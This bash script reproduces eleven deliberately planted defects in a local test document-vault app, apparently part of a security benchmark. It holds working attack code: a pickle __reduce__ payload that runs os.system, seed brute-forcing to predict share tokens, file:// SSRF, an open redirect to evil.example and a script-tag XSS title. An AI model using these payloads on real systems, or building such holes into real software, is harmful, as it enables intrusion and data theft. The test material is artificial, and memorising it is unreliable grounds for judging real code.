#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"

export PYTHONDONTWRITEBYTECODE=1
DATA_DIR=$(mktemp -d)
PORT=${PORT:-8313}
BASE="http://127.0.0.1:$PORT"
SERVER_PID=""
REPRODUCED=0
T0=$(python3 -c 'import time; print(int(time.time()))')

cleanup() {
    if [[ -n "$SERVER_PID" ]]; then
        kill "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    fi
    rm -rf "$DATA_DIR"
}
trap cleanup EXIT

DATA_DIR="$DATA_DIR" PORT="$PORT" python3 app.py &
SERVER_PID=$!
for _ in $(seq 1 50); do
    curl -sf "$BASE/health" >/dev/null 2>&1 && break
    sleep 0.2
done
T1=$(python3 -c 'import time; print(int(time.time()))')

b64() { python3 -c 'import base64,sys; print(base64.b64encode(sys.argv[1].encode()).decode())' "$1"; }
upload() {  # api_key title body_b64 -> id
    curl -s -X POST "$BASE/upload" -H "X-Api-Key: $1" -H 'Content-Type: application/json' \
        -d "{\"title\": \"$2\", \"body\": \"$3\", \"meta\": {\"format\": \"text\"}}" \
        | python3 -c 'import json,sys; print(json.load(sys.stdin).get("id", ""))'
}

DOC1=$(upload alice-key "notes one" "$(b64 'first document body')")

# PY04-D01 predictable_share_token: tokens come from random seeded with startup time
token1=$(curl -s -X POST "$BASE/share" -H 'X-Api-Key: alice-key' -H 'Content-Type: application/json' \
    -d "{\"id\": \"$DOC1\", \"ttl_seconds\": 3600}" | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
predicted=$(python3 - "$T0" "$T1" "$token1" <<'EOF'
import random, sys
t0, t1, token1 = int(sys.argv[1]), int(sys.argv[2]), sys.argv[3]
for seed in range(t0 - 3, t1 + 4):
    rng = random.Random(seed)
    if "%012x" % int(rng.random() * (1 << 48)) == token1:
        print("%012x" % int(rng.random() * (1 << 48)))
        break
else:
    print("")
EOF
)
issued=$(curl -s -X POST "$BASE/share" -H 'X-Api-Key: alice-key' -H 'Content-Type: application/json' \
    -d "{\"id\": \"$DOC1\", \"ttl_seconds\": 3600}" | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
if [[ -n "$predicted" && "$predicted" == "$issued" ]]; then
    echo "[REPRODUCED] PY04-D01 predictable_share_token: brute-forced seed predicted token $predicted before it was issued"
    REPRODUCED=$((REPRODUCED + 1))
else
    echo "[NOT REPRODUCED] PY04-D01 predictable_share_token: predicted='$predicted' issued='$issued'"
fi

# PY04-D02 early_exit_compare: token_matches short-circuits on the first difference
stats=$(python3 - <<'EOF'
import statistics, time
import vault
expected = "a" * 2000
late = "a" * 1999 + "b"
early = "b" + "a" * 1999
def med(provided):
    samples = []
    for _ in range(200):
        t = time.perf_counter_ns()
        vault.token_matches(provided, expected)
        samples.append(time.perf_counter_ns() - t)
    return statistics.median(samples)
e = med(early)
l = med(late)
print(f"{l:.0f} {e:.0f} {l / e:.1f}")
EOF
)
late_ns=$(echo "$stats" | cut -d' ' -f1); early_ns=$(echo "$stats" | cut -d' ' -f2); ratio=$(echo "$stats" | cut -d' ' -f3)
ok=$(python3 -c "print(1 if $ratio > 1.5 else 0)")
if [[ "$ok" == "1" ]]; then
    echo "[REPRODUCED] PY04-D02 early_exit_compare: last-char diff ${late_ns}ns vs first-char diff ${early_ns}ns (ratio ${ratio}x)"
    REPRODUCED=$((REPRODUCED + 1))
else
    echo "[NOT REPRODUCED] PY04-D02 early_exit_compare: late=${late_ns}ns early=${early_ns}ns ratio=${ratio}"
fi

# PY04-D03 fetch_any_scheme: /fetch reads file:// URLs
echo "vault-ssrf-marker-9021" > "$DATA_DIR/loot.txt"
resp=$(curl -s -H 'X-Api-Key: eve-key' "$BASE/fetch?url=file://$DATA_DIR/loot.txt" || true)
fid=$(echo "$resp" | python3 -c 'import json,sys; print(json.load(sys.stdin)["id"])' 2>/dev/null || true)
body=$(curl -s -H 'X-Api-Key: eve-key' "$BASE/doc?id=$fid" || true)
if [[ "$body" == *vault-ssrf-marker-9021* ]]; then
    echo "[REPRODUCED] PY04-D03 fetch_any_scheme: /fetch?url=file://... stored '$body'"
    REPRODUCED=$((REPRODUCED + 1))
else
    echo "[NOT REPRODUCED] PY04-D03 fetch_any_scheme: resp=$resp body=$body"
fi

# PY04-D04 pickle_payload: meta.format object deserializes the upload
payload=$(python3 - "$DATA_DIR" <<'EOF'
import base64, os, pickle, sys
class P:
    def __reduce__(self):
        return (os.system, (f"touch {sys.argv[1]}/imported.marker",))
print(base64.b64encode(pickle.dumps(P())).decode())
EOF
)
curl -s -o /dev/null -X POST "$BASE/upload" -H 'X-Api-Key: alice-key' -H 'Content-Type: application/json' \
    -d "{\"title\": \"obj\", \"body\": \"$payload\", \"meta\": {\"format\": \"object\"}}" || true
if [[ -f "$DATA_DIR/imported.marker" ]]; then
    echo "[REPRODUCED] PY04-D04 pickle_payload: object upload ran __reduce__ -> $DATA_DIR/imported.marker created"
    REPRODUCED=$((REPRODUCED + 1))
else
    echo "[NOT REPRODUCED] PY04-D04 pickle_payload: marker not created"
fi

# PY04-D05 purge_header_presence: any X-Admin-Key value purges everything
before=$(curl -s "$BASE/health" | python3 -c 'import json,sys; print(json.load(sys.stdin)["docs"])')
resp=$(curl -s -X POST "$BASE/admin/purge" -H 'X-Admin-Key: whatever' || true)
after=$(curl -s "$BASE/health" | python3 -c 'import json,sys; print(json.load(sys.stdin)["docs"])')
if [[ "$before" -gt 0 && "$resp" == *'"purged"'* && "$after" == "0" ]]; then
    echo "[REPRODUCED] PY04-D05 purge_header_presence: X-Admin-Key 'whatever' purged $before docs -> $after"
    REPRODUCED=$((REPRODUCED + 1))
else
    echo "[NOT REPRODUCED] PY04-D05 purge_header_presence: before=$before resp=$resp after=$after"
fi

# PY04-D06 quota_race: 20 parallel 16KiB uploads all pass the quota check
accepted=$(python3 - "$BASE" <<'EOF'
import base64, json, sys, threading, urllib.request
base = sys.argv[1]
body = base64.b64encode(b"x" * 16384).decode()
barrier = threading.Barrier(20)
ok = [0]
def fire(n):
    barrier.wait()
    req = urllib.request.Request(
        base + "/upload",
        data=json.dumps({"title": f"bulk-{n}", "body": body, "meta": {"format": "text"}}).encode(),
        headers={"Content-Type": "application/json", "X-Api-Key": "racer-key"},
    )
    try:
        if urllib.request.urlopen(req).status == 201:
            ok[0] += 1
    except Exception:
        pass
threads = [threading.Thread(target=fire, args=(n,)) for n in range(20)]
for t in threads: t.start()
for t in threads: t.join()
print(ok[0])
EOF
)
# at most 4 uploads of 16KiB fit under the 64KiB quota
if [[ "$accepted" -ge 5 ]]; then
    echo "[REPRODUCED] PY04-D06 quota_race: $accepted/20 uploads of 16KiB accepted although only 4 fit under the 64KiB quota"
    REPRODUCED=$((REPRODUCED + 1))
else
    echo "[NOT REPRODUCED] PY04-D06 quota_race: only $accepted uploads accepted"
fi

# PY04-D07 open_redirect: /go redirects to an arbitrary external URL
loc=$(curl -s -o /dev/null -w '%{redirect_url}' "$BASE/go?next=https://evil.example/x" || true)
if [[ "$loc" == "https://evil.example/x" ]]; then
    echo "[REPRODUCED] PY04-D07 open_redirect: /go?next=https://evil.example/x -> Location $loc"
    REPRODUCED=$((REPRODUCED + 1))
else
    echo "[NOT REPRODUCED] PY04-D07 open_redirect: location=$loc"
fi

# PY04-D08 title_xss: document titles render unescaped in docs.html
upload alice-key "<script>alert(2)</script>" "$(b64 'xss body')" >/dev/null
html=$(curl -s "$BASE/docs.html" || true)
if [[ "$html" == *'<script>alert(2)</script>'* ]]; then
    echo "[REPRODUCED] PY04-D08 title_xss: docs.html contains raw <script> title"
    REPRODUCED=$((REPRODUCED + 1))
else
    echo "[NOT REPRODUCED] PY04-D08 title_xss: html=$html"
fi

# PY04-D09 temp_leftovers: every upload leaves a staged file behind in tmp/
tmp_count=$(find "$DATA_DIR/tmp" -type f | wc -l)
docs_count=$(find "$DATA_DIR/docs" -type f | wc -l)
if [[ "$tmp_count" -ge 6 && "$tmp_count" == "$docs_count" ]]; then
    echo "[REPRODUCED] PY04-D09 temp_leftovers: tmp/ holds $tmp_count .part files for $docs_count docs"
    REPRODUCED=$((REPRODUCED + 1))
else
    echo "[NOT REPRODUCED] PY04-D09 temp_leftovers: tmp=$tmp_count docs=$docs_count"
fi

# PY04-D10 negative_share_ttl: a negative ttl produces an already-expired share
DOC2=$(upload alice-key "post-purge doc" "$(b64 'another body')")
resp=$(curl -s -X POST "$BASE/share" -H 'X-Api-Key: alice-key' -H 'Content-Type: application/json' \
    -d "{\"id\": \"$DOC2\", \"ttl_seconds\": -60}" || true)
verdict=$(echo "$resp" | python3 -c 'import json,sys; s=json.load(sys.stdin); print("expired" if s["expires_at"] < s["created_at"] else "valid")' 2>/dev/null || echo "noshare")
if [[ "$verdict" == "expired" ]]; then
    echo "[REPRODUCED] PY04-D10 negative_share_ttl: ttl=-60 -> $resp"
    REPRODUCED=$((REPRODUCED + 1))
else
    echo "[NOT REPRODUCED] PY04-D10 negative_share_ttl: resp=$resp"
fi

# PY04-D11 unknown_doc_deref: reading a missing doc id crashes with a 500
status=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/doc?id=nonexistent&token=x" || true)
if [[ "$status" == "500" ]]; then
    echo "[REPRODUCED] PY04-D11 unknown_doc_deref: GET /doc?id=nonexistent -> HTTP 500 instead of 404"
    REPRODUCED=$((REPRODUCED + 1))
else
    echo "[NOT REPRODUCED] PY04-D11 unknown_doc_deref: status=$status"
fi

expected=$(python3 -c 'import json; print(len(json.load(open("DEFECTS.json"))["defects"]))')
echo "repro.sh: $REPRODUCED/$expected defects reproduced"
[[ "$REPRODUCED" == "$expected" ]]
